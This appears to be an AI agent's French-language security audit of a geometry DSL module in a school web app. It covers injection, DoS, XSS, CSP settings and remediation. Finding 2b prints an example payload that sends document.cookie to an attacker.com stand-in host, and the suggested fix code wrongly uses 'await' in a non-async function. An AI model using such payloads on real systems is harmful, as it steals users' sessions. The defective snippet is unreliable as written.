---
title: Audit de securite — module geometry-core
date: 2026-05-18
author: security-auditor agent
posture: Acceptable
---

# Audit de securite — `src/lib/geometry-core/`

## Resume executif

Le module `geometry-core` est une bibliotheque de calcul mathematique et de rendu cote client. Il n'a pas d'acces reseau direct, pas de surface d'authentification, et ne manipule aucune PII. Sa posture de securite est **Acceptable** : le controle le plus important — absence de `eval()` ou `Function()` dans le pipeline d'execution DSL — est confirme. Cependant, trois problemes concrets requierent de l'attention : un appel `new Function()` non relie dans le module game qui execute du contenu DB non sanitise, un cache AST module-level non borne exploitable pour epuisement memoire, et le `unsafe-eval` inconditionnel dans la Content Security Policy qui annule la protection contre l'eval-injection sur tout le site.

---

## 1. Surface d'attaque

### Points d'entree DSL

Le DSL est traite par un pipeline de quatre fichiers :

1. `src/lib/geometry-core/dsl/tokenizer.ts` — string vers tokens
2. `src/lib/geometry-core/dsl/parser.ts` — tokens vers AST (`DslProgram`)
3. `src/lib/geometry-core/dsl/interpreter.ts` — `interpret(program)` parcourt l'AST
4. `src/lib/geometry-core/dsl/builtins.ts` — handlers des builtins (`point`, `courbe`, `texte`, etc.)

L'API publique `interpret()` / `runDsl()` est appelee depuis :

- `src/lib/constructions-v2/components/ConstructionPlayer.svelte` — live-preview du script edite par l'enseignant
- `src/routes/(public)/geometry-demo/DslDemo.svelte` — pages de demo statiques, DSL vient du code source, pas de l'utilisateur
- `src/routes/(public)/construction-demo/+page.svelte` — playground de demo, appel authentifie, stocke dans la table `construction_demo_scripts` (max 100 KB valide cote serveur)

**Les eleves n'ont aujourd'hui aucun chemin pour soumettre du DSL arbitraire.** Le `ScriptEditor` n'est accessible que via `(protected)/constructions/new` et `(protected)/constructions/[id]/edit`, deux routes enseignant. L'API des constructions valide `dsl_script` avec `.max(50000)` (Zod, cote serveur).

### Resume des frontieres de confiance

| Entree                                          | De confiance ?                                   | Notes                                                                                                                            |
| ----------------------------------------------- | ------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------- |
| DSL ecrit par enseignant                        | Partiellement                                    | Les enseignants sont des utilisateurs de confiance ; les eleves ne peuvent pas soumettre de DSL aujourd'hui                      |
| `dsl_script` depuis la DB (table constructions) | De confiance a la source, valide a la couche API | Utilisateur authentifie ; Zod `max(50_000)` a l'ecriture                                                                         |
| `dsl_script` depuis `construction_demo_scripts` | De confiance a la source                         | `max(100_000)`, enseignant authentifie                                                                                           |
| Champs `expression` dans `game_challenges`      | **Non valide avant `new Function()`**            | Voir finding #1 — ecrits par les enseignants uniquement aujourd'hui, mais le chemin d'evaluation est non securise                |
| Interactions drag / slider                      | Pas de re-parse DSL                              | Mutations numeriques pures sur l'objet `Figure` en memoire                                                                       |
| Argument nomme `couleur=`                       | String fournie par l'utilisateur                 | Passee a `resolveColorName()` qui retombe sur la string brute ; utilisee comme valeur d'attribut SVG (pas HTML), voir finding #5 |

---

## 2. Risques d'injection

### 2a. Pas de `eval` / `Function` dans le pipeline DSL — confirme sain

Verification : `grep -rn "eval(\|new Function(" src/lib/geometry-core --include="*.ts"` ne retourne aucun match hors fichiers de test. Le compilateur (`src/lib/mathAST/eval/compile.ts`) construit des closures JS natives en parcourant l'AST avec des branches explicites `if (isAddition)` / `if (isFunction)` et une whitelist de 22 fonctions mathematiques (`sin`, `cos`, `sqrt`, etc.). Les noms de fonctions inconnus levent une `CompileError`. Aucune string n'est passee a `eval` ou `Function` a aucun moment.

### 2b. CRITIQUE — `new Function()` sur des strings d'expression DB non validees

**Fichier :** `src/lib/utils/game/challenge-variables.ts`, lignes 68–76

```typescript
function evaluateExpression(expression: string, variables: Record<string, number>): number {
	let expr = expression;
	// ...replace sqrt(), ^ ...
	const fn = new Function('return ' + expr);
	return typeof fn() === 'number' ? fn() : NaN;
}
```

Concatene une string arbitraire depuis le champ `expression` de `game_challenges.variables` (une colonne JSONB) et la passe a `new Function()`. La fonction execute dans le scope global du Worker (ou du main thread si appelee cote serveur).

**Chemin d'exploitation :** Un enseignant avec `INSERT` sur `game_challenges` (verifie via `056_add_game_rls_policies.sql`) peut stocker un challenge comme `{ "variables": { "x": { "type": "expression", "expression": "fetch('https://attacker.com/?c='+document.cookie)" } } }`. Chaque eleve qui entre en combat avec ce challenge execute le code injecte dans sa session navigateur.

**Severite : HIGH.** Seuls les enseignants peuvent ecrire des challenges aujourd'hui, donc la portee est limitee ; mais le pattern est fondamentalement non securise et deviendra critique si un futur chemin permet une creation de challenges plus large.

**Mitigation :** Remplacer `new Function()` par l'evaluateur securise deja present dans la codebase :

```typescript
import { createSafeEvaluator } from '$lib/mathAST/eval/compile';
import { parseCustom } from '$lib/mathAST';

function evaluateExpression(expression: string, vars: Record<string, number>): number {
	try {
		const ast = parseCustom(expression);
		const fn = createSafeEvaluator(ast, 'x'); // ou compile(ast) directement
		// injecter toutes les variables comme bindings via compile(ast)
		const { compile } = await import('$lib/mathAST/eval/compile');
		return compile(ast)(vars);
	} catch {
		return NaN;
	}
}
```

`compile()` depuis `$lib/mathAST/eval/compile` accepte des bindings `Record<string,number>` et supporte toutes les operations arithmetiques, trigo, et de puissance deja utilisees dans les expressions de challenge. L'appel `new Function()` est le seul de la codebase liee a la geometrie ; les deux autres usages `new Function` (`js-sandbox.worker.ts` executant du JS bridge depuis Python) sont dans un worker isole et hors perimetre ici.

---

## 3. DoS — Cote client

### 3a. Limites d'iteration en place

L'interpreteur DSL applique un plafond strict de **1 000 iterations** sur les deux boucles `pour i de ... a ...` et `pour x dans ...` (`interpreter.ts` lignes 321–343). La recursion macro est plafonnee a profondeur 10 (`macro-registry.ts` ligne 11). Ces limites sont adequates.

Les solveurs Newton (intersection parametrique, drag `point_sur`) sont plafonnes a **20 iterations** avec bornes de boucle strictes (`parametric-intersection.ts:204`, `parametric-newton.ts:101`, `parametric-intersection-1d.ts:90`). Les nombres de multi-starts (8 ou 16 starts) sont des constantes hardcoded — non controlables par l'utilisateur.

### 3b. Nombres d'echantillons de courbes — bornes mais non configurables par l'utilisateur

Les courbes fonction et parametriques utilisent des nombres d'echantillons fixes determines par le viewport et des constantes internes (non parametrables depuis le DSL). L'algorithme marching-squares pour les courbes implicites (`rendering/marching-squares.ts`) utilise `DEFAULT_GRID_SIZE = 200`, soit 200×200 = 40 000 evaluations par frame de rendu. C'est fixe — le parametre `gridSize` n'est pas expose au DSL.

`lieu()` (locus) utilise par defaut `numSamples = 200` avec 3 niveaux de raffinement adaptatif (`MAX_REFINE_DEPTH = 3`). Chaque raffinement peut au maximum doubler le nombre d'echantillons sur chaque segment, borne a quelques milliers de points en pratique.

Les elements trace sont plafonnes a `TRACE_MAX_POINTS = 500` (`figure.ts:249`).

**Aucune boucle non bornee pilotee par l'entree utilisateur n'a ete trouvee.**

### 3c. Cache de parse module-level non borne — risque DoS MEDIUM — **CORRIGE 2026-05-18**

> **Statut : FIXED.** `PARSE_CACHE` et `PARSE_FAILURE_CACHE` sont desormais plafonnes a 5 000 entrees chacun (constante `PARSE_CACHE_MAX`). Quand le cap est atteint, le cache est vide avant la prochaine insertion. Voir `dsl/interpreter.ts:158-164` et les 2 sites d'insertion en lignes 440 et 446.

**Fichier :** `src/lib/geometry-core/dsl/interpreter.ts`, lignes 158–160

```typescript
const PARSE_CACHE = new Map<string, MathNode>(); // jamais nettoye
const PARSE_FAILURE_CACHE = new Set<string>(); // jamais nettoye
```

Ces caches sont module-level (singleton pour la duree de vie de l'onglet navigateur). Chaque sous-expression string distincte rencontree dans n'importe quelle execution DSL est stockee de facon permanente. Une boucle `pour` de 1 000 iterations dont le corps contient des expressions parametrees par un compteur (par exemple `f_{i}` pour `i` de 1 a 1000) produirait 1 000 entrees de cache distinctes par execution. Si un enseignant construit un script avec `pour i de 1 a 1000` contenant une expression unique par iteration, le cache grandit indefiniment sur plusieurs appels `runDsl()` dans la meme session (par exemple en mode live-preview pendant que l'enseignant tape).

**Severite : MEDIUM.** L'exploitation requiert un enseignant fabriquant un script pour epuiser la memoire, pas un eleve. Le seuil pratique avant qu'un onglet plante est de l'ordre de millions d'entrees ; l'atteindre demanderait un effort deliberement soutenu. Cependant, une borne de taille simple eliminerait le risque :

```typescript
const PARSE_CACHE_MAX = 5_000;
if (PARSE_CACHE.size >= PARSE_CACHE_MAX) PARSE_CACHE.clear(); // ou LRU
```

---

## 4. XSS via DSL

### 4a. `{@html}` avec rough-geometry `outerHTML` — sain

Les fonctions `roughLineHTML()`, `roughCircleHTML()`, etc. retournent `element.outerHTML` d'elements SVG crees par la bibliotheque `roughjs` via son API DOM normale. Les entrees (coordonnees de lignes, rayons de cercles, sommets de polygones) sont toutes des valeurs numeriques derivees de l'etat interne de la figure — jamais des strings utilisateur brutes. Les attributs de coordonnees SVG ne permettent pas l'injection HTML. Cet usage est sain.

### 4b. `{@html convertLatexToMarkup(svg.text, ...)}` — conditionnellement sain

**Fichier :** `src/lib/components/geometry/GeometryCanvas.svelte`, ligne 1968

`svg.text` est la string template resolue pour les elements `mathText` (depuis `mtexte(point, "\\frac{x}{2}")` dans le DSL). La fonction `convertLatexToMarkup()` de MathLive est un renderer LaTeX vers MathML/HTML. MathLive n'execute pas de JavaScript depuis son entree ; les commandes LaTeX sont mappees a des elements HTML. Le profil de risque ici est equivalent a tout renderer LaTeX — une entree malformee pourrait produire un rendu casse mais pas d'execution de script.

**Flux des labels `texte()` (texte brut) :** Les placeholders template `{id}` sont remplaces par des valeurs numeriques depuis `scalarValues` (un `ReadonlyMap<string,number>`). Les placeholders inconnus sont retournes tels quels. La string finale est passee a `escapeHtml()` (lignes 306–308) avant l'injection `{@html}`. C'est correctement echappe.

**Labels riches `rtexte()` :** La string est parsee via `parseMarkdown()` depuis le parser markup interne, decomposee en `InlineNode[]`, puis reassemblee par `inlineNodesToHTML()`. Les noeuds texte passent par `escapeHtml()`. Les noeuds math-inline passent par `convertLatexToMarkup()`. Le commentaire de code a la ligne 337 note explicitement :

> NOTE: si tu ajoutes une branche 'link', sanitise node.url (bloque les URIs javascript:/data:).

Les liens sont actuellement silencieusement dropes (retournes `''`). C'est sain aujourd'hui, mais le commentaire est un avertissement correct pour le futur.

### 4c. Valeurs de couleur dans les attributs SVG — risque faible, non exploitable pour injection de script

`resolveColorName()` (`builtins.ts:126–128`) mappe les noms de couleurs francais vers hex et retombe sur la string brute pour le reste. Une string arbitraire comme `red; onmouseover=alert(1)` serait definie comme valeur d'attribut SVG `stroke` ou `fill` via le binding reactif Svelte (par exemple `stroke={sty.color}`). Le moteur de template Svelte definit cela comme valeur d'attribut DOM (pas via `innerHTML`), donc l'echappement d'attribut n'est pas exploitable — le navigateur traite ca comme une string d'attribut literale, pas du HTML. La couleur serait rendue invalide et ignoree par le renderer SVG, sans consequence de securite.

---

## 5. Validation des entrees

### 5a. Le parser DSL n'a pas de limite de taille d'entree — **CORRIGE 2026-05-18**

> **Statut : FIXED.** `parse()` dans `dsl/parser.ts:36-43` rejette desormais tout source DSL depassant 100 000 caracteres avec une `DslParseError` claire. Defense en profondeur (le serveur valide deja Zod `max(50_000)` ou `max(100_000)` selon l'endpoint). Tests de regression dans `dsl/__tests__/parser.test.ts`.

**Fichier :** `src/lib/geometry-core/dsl/parser.ts` / `tokenizer.ts`

Aucune verification de longueur sur la string source DSL avant tokenisation. Une entree de 10 MB serait traitee sans erreur (bien que la couche API plafonne `dsl_script` a 50 000 caracteres cote serveur). Le tokeniser est un scan O(n) en une passe ; le parser est une descente recursive en une passe. Aucun des deux n'a de limite de profondeur sur l'imbrication d'expressions. Une entree pathologique comme 100 000 parentheses imbriquees `(((((...))))` epuiserait la pile d'appels JS via les appels recursifs `parseExpr()` → `parsePrimary()` → `parseExpr()`.

**Severite : LOW** pour le deploiement actuel (enseignants uniquement, le serveur valide la taille a 50 KB). Serait MEDIUM si le DSL etait un jour expose aux eleves.

**Mitigation :** Ajouter une garde simple au point d'entree :

```typescript
export function runDsl(source: string, ...): InterpretResult {
    if (source.length > 100_000) throw new Error('DSL trop long (max 100 000 caracteres)');
    // ...
}
```

### 5b. Grammaire stricte — les constructions non reconnues levent des erreurs

Confirme : noms de fonctions inconnus (`compileFunction`, ligne 281 : `throw new CompileError('Unsupported function: ' + name)`), variables non definies, listes d'arguments malformees — tous produisent une `DslRuntimeError` avec numero de ligne. L'interpreteur n'ignore pas silencieusement les erreurs.

---

## 6. Donnees sensibles

Le module ne contient aucun identifiant utilisateur, aucune PII, aucun token d'authentification, et aucune requete DB. Il manipule des objets purement mathematiques/geometriques. La seule donnee externe qu'il gere est les URLs d'images (validees a `^https?://|^/` a la ligne 1394 de `builtins.ts`), ce qui bloque correctement les schemes d'URI `javascript:` et `data:`.

---

## 7. Couplage API / DB

Le module geometry-core lui-meme ne fait aucun appel reseau (confirme : zero `fetch`/`supabase` hors fichiers de test). L'API des constructions qui persiste le DSL :

- Requiert l'authentification (`requireAuth`)
- Valide `dsl_script` avec `z.string().max(50_000)` et `dsl_script` pour l'endpoint demo avec `z.string().max(100_000)`
- Verifie la propriete avant les updates et deletes
- Utilise des requetes Supabase parametrees (pas de surface d'injection SQL)

---

## 8. CSP et `unsafe-eval`

**Fichier :** `src/hooks.server.ts`, ligne 432

La directive CSP script inclut `'unsafe-eval'`. Le commentaire explique que c'est requis par le compilateur Typst.js (`new Function()` en interne). Cela signifie que le navigateur executera tout appel `eval()` ou `Function()` injecte dynamiquement dans la page, y compris l'usage de `challenge-variables.ts` documente dans le finding #2b, et toute future charge utile XSS qui atteint cette surface.

**Severite : INFO** pour la CSP seule (le besoin est reel). Mais elle interagit avec le finding #2b : si cet appel `new Function()` etait remplace par l'evaluateur securise, `unsafe-eval` pourrait potentiellement etre scopee aux contextes Typst-uniquement ou supprimee entierement selon le modele de chargement de Typst.

---

## Top 5 findings prioritaires

| #   | Severite             | Fichier                                             | Lignes  | Description                                                                                                                                               |
| --- | -------------------- | --------------------------------------------------- | ------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | HIGH                 | `src/lib/utils/game/challenge-variables.ts`         | 68–76   | `new Function('return ' + expr)` sur des strings d'expression depuis la DB `game_challenges.variables`                                                    |
| 2   | ~~MEDIUM~~ **FIXED** | `src/lib/geometry-core/dsl/interpreter.ts`          | 158–164 | `PARSE_CACHE` plafonne a 5 000 entrees (2026-05-18)                                                                                                       |
| 3   | ~~LOW~~ **FIXED**    | `src/lib/geometry-core/dsl/parser.ts`               | 36–43   | Garde de longueur 100 000 caracteres ajoutee (2026-05-18)                                                                                                 |
| 4   | INFO                 | `src/hooks.server.ts`                               | 432     | `'unsafe-eval'` dans CSP `script-src` est site-wide, annule la protection contre eval-injection                                                           |
| 5   | INFO                 | `src/lib/components/geometry/GeometryCanvas.svelte` | 337     | Commentaire de code existant avertit d'un futur risque d'injection d'URL `link` node dans `inlineNodesToHTML` — correct mais merite un test de regression |

---

## Controles de securite positifs

Les controles suivants ont ete trouves correctement implementes :

- **Zero `eval`/`Function` dans le pipeline DSL.** L'evaluateur `compile()` est un constructeur de closures qui parcourt l'AST avec une whitelist stricte. C'est le controle le plus important pour un parser DSL.
- **Limite de profondeur de recursion macro** de 10 (`macro-registry.ts:11`).
- **Plafond d'iteration de boucle** de 1 000 (`interpreter.ts:321,339`).
- **Plafonds d'iteration des solveurs Newton** de 20 a travers les trois solveurs parametriques.
- **`TRACE_MAX_POINTS = 500`** previent l'accumulation non bornee de points dans les elements trace.
- **Whitelist d'URLs d'images** (`^https?://|^/`) bloque les URIs `javascript:` et `data:` dans le builtin `image()`.
- **Echappement de texte** dans `inlineNodesToHTML` via `escapeHtml()` pour les noeuds texte brut.
- **Validation de taille DSL cote serveur** (50 KB pour les constructions, 100 KB pour les scripts demo) via Zod.
- **Policy RLS** sur `game_challenges` restreint INSERT a `role = 'teacher'`, limitant le rayon d'impact du finding #1.
- **Suite complete de headers de securite** : CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy.

---

## Roadmap de remediation

| Priorite                                | Action                                                                                                                                                                | Effort    |
| --------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- |
| 1 (immediat)                            | Remplacer `new Function()` dans `challenge-variables.ts` par `compile()` depuis `$lib/mathAST/eval/compile`                                                           | 1 heure   |
| ~~2 (court terme)~~ **DONE 2026-05-18** | Ajouter une borne de taille `PARSE_CACHE_MAX` dans `interpreter.ts`                                                                                                   | 30 min    |
| ~~3 (court terme)~~ **DONE 2026-05-18** | Ajouter une garde de longueur dans `parseDsl()`                                                                                                                       | 15 min    |
| 4 (moyen terme)                         | Ajouter un test de regression assertant que `inlineNodesToHTML` drop les noeuds `link` et ne rend pas les valeurs `href`                                              | 1 heure   |
| 5 (long terme)                          | Investiguer si Typst peut etre charge d'une facon qui evite `'unsafe-eval'` dans la CSP de la page principale (par exemple isoler dans un worker dedie ou sous-frame) | 1–2 jours |
